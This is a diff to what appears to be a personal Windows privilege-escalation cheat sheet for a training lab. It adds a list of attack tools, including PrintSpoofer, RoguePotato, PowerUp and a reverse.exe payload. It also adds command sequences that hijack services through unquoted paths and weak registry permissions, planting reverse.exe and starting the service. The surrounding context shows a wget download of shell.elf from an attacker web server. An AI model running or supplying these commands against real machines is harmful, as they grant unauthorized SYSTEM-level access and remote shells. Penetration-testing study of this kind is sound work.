@@ -36,6 +36,33 @@ python3 -m http.server
 wget http://10.18.5.137:8000/shell.elf
 ```
 
+## TOOLS
+```
+VICTIM WINDOWS 
+
+accesschk.exe
+AdminPaint.lnk
+CreateShortcut.vbs
+lpe.bat
+plink.exe
+PowerUp.ps1
+PrintSpoofer.exe
+Procmon64.exe
+PsExec64.exe
+reverse.exe
+RoguePotato.exe
+savecred.bat
+Seatbelt.exe
+SharpUp.exe
+winPEASany.exe
+
+
+ATTACK MACHINE KALI 
+reverse.exe
+```
+
+
+
 # 2. MANUAL ENUMERATION 
 
 ## USERS
@@ -122,6 +149,29 @@ sc qc daclsvc
 sc start daclsvc
 ```
 
+## CATEGORY "SERVICES" - UNQUOTED SERVICE PATHS
+```
+.\winPEASany.exe servicesinfo (powershell)
+winPEASany.exe servicesinfo (cmd)
+
+sc qc unquotedsvc
+accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+sc start unquotedsvc
+```
+
+## CATEGORY "SERVICES" - WEAK REGISTRY PERMISSIONS
+```
+.\winPEASany.exe servicesinfo (powershell)
+winPEASany.exe servicesinfo (cmd)
+
+sc qc regsvc
+accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+regedit
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+net start regsvc
+```
 
 
 
